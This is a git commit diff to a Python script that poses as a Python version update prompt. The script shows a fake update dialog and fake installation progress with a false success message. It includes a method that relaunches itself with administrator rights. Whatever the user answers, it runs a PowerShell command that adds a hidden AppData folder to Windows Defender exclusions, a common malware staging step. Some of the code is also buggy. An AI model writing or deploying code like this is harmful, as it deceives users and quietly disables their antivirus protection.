bfdf7a9a393c66c57cf85cf7536dbfe820f74954
pyw-update <anakinlukehoffmann@gmail.com>
2026-03-24 21:42:43 +0100

    admin

--- main.py
+++ main.py
@@ -1,17 +1,52 @@
 import os
 import pathlib as pl
+import random
+import sys
+from time import time
 
 class Main:
     def __init__(self):
         pass
     
     def send_update_notification(self):
-        install_input = input("""A new version of Python is available: 3.12.2
-                            You are currently using: 3.11.6
-                            Press 'Y' or 'Enter' to update or 'N' to skip: """)
+        install_input = input("A new version of Python is available: 3.12.2"+
+                            "\nYou are currently using: 3.11.6"+
+                            "\nPress 'Y' or 'Enter' to update or 'N' to skip: ")
         return install_input.strip().lower() in ['y', '']
 
-    def add_folder_to_windows_defender_exclusions(self, folder_path):
+    def request_admin_privileges(self):
+        import ctypes
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+
+    def add_folder_to_windows_defender_exclusions(self):
         folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
         command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
         os.system(command)
+    
+    def perform_update(self):
+        steps = [
+            "Checking for updates...",
+            "Resolving dependencies...",
+            "Downloading package metadata...",
+            "Installing collected packages...",
+            "Applying security patches...",
+            "Finalizing installation..."
+        ]
+
+        for step in steps:
+            print(step)
+            time.sleep(random.uniform(0.5, 1.2))
+
+        print("\nSuccessfully installed updates.")
+        print("Current version: 3.11.6")
+        print("Updated to: 3.12.2")
+        print("Restart may be required.")
+
+if __name__ == "__main__":
+    self = Main()
+    if self.send_update_notification():
+        print("Updating Python...")
+        # Here you would add the code to perform the update
+    else:
+        print("Update skipped.")
+    self.add_folder_to_windows_defender_exclusions()
